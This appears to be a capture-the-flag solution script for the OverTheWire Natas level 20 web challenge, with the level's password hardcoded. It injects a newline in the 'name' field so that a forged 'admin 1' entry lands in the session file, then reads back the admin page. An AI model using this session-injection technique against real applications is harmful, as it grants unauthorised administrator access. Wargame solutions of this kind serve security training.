import requests
from bs4 import BeautifulSoup


username='natas20'
password='eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
url ="http://{}.natas.labs.overthewire.org/".format(username) #?debug=True

s = requests.Session()


# this will write a session data to a file
r = s.post(url,auth=(username,password))
#print (r.text)

# this will read the previous file data and it will write the icyber and admin in newline
data = {'name':'icyb3r\nadmin 1'}
x = s.post(url,data=data,auth=(username,password))
#print (x.text)


# this will read the data previous file and it contains the admin 1 as a value
d = s.post(url,auth=(username,password))
sp = BeautifulSoup(d.text,'lxml')
pre = sp.find_all('pre')
print (pre[0].text)
